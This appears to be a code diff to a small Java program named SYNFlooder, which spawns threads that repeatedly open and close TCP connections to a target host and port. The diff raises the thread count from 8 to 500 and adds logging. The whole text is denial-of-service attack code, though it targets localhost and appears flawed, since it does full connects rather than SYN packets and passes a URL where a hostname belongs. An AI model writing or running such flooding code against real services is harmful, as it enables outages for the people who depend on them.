@@ -18,6 +18,7 @@ public class SYNFlooder implements Runnable {
             try{
                 Socket socket = new Socket();
                 socket.connect(new InetSocketAddress(url, port), 2500);
+                System.out.println(this + "==" + socket.getInetAddress());
                 Thread.sleep(100);
                 socket.close();
             }catch (Exception e){
@@ -27,9 +28,9 @@ public class SYNFlooder implements Runnable {
 
     }
     public static void main (String[] args){
-        for (int i = 0; i < 8; i++) {
+        for (int i = 0; i < 500; i++) {
+            System.out.println("Thread "+i);
             new Thread(new SYNFlooder("http://localhost", 5000)).start();
-
         }
     }
 }
